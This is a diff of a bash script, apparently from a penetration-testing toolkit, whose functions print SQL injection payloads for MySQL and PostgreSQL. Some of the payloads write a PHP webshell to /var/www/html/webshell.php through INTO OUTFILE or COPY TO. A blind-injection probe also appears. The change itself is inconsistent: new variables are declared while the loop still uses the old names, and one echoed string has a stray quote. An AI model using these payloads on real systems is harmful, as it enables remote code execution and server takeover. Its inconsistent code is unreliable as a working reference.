@@ -62,12 +62,12 @@ get_blind_sqli_commands() {
     echo "' AND (SELECT COUNT(*) FROM user_tables)>0 --"
 }
 
-get_php_sql_injection() {
+get_mysql_injection() {
     if [[ ! -z "$1" ]]; then
         cmd="$1"
     fi    
     if [[ -z "$cmd" ]]; then
-        cmd="[cmd]"
+        cmd="cmd"
     fi
     if [[ ! -z "$2" ]]; then
         outfile_location=$2
@@ -76,16 +76,33 @@ get_php_sql_injection() {
         outfile_location="/var/www/html/webshell.php"
     fi
     if [[ ! -z "$3" ]]; then
-        num_sql_null="$3"
+        num_sql_back_null="$3"
     fi
-    if [[ -z "$num_sql_null" ]]; then
-        num_sql_null=4
+    if [[ -z "$num_sql_back_null" ]]; then
+        num_sql_back_null=4
     fi
-    local null_values=""
+    if [[ -z "$num_sql_front_null" ]]; then
+        num_sql_front_null=0
+    fi
+    local back_null_values=""
     for ((i=1; i<=num_sql_null; i++)); do
         null_values+=", null"
-    done    
-    echo  " UNION SELECT \"<?php echo system('$cmd');?>\" $null_values INTO OUTFILE \"$outfile_location\""
+    done
+    if [[ ! -z "$union_select" ]] && [[ $union_select == true ]]; then
+        echo  " UNION SELECT \"$cmd')\" $null_values INTO OUTFILE \"$outfile_location\""
+    else
+        echo  " OR 1=1 IN (Select '$cmd') INTO OUTFILE \"$outfile_location\""
+    fi
+}
+
+get_postgresql_injection() {
+    if [[ -z "$cmd" ]]; then
+        cmd="cmd"
+    fi
+    if [[ -z "$outfile_location" ]]; then
+        outfile_location="/var/www/html/webshell.php"
+    fi
+    echo " COPY (SELECT '$cmd') TO \"$outfile_location\""
 }
 
 get_mssql_injection() {
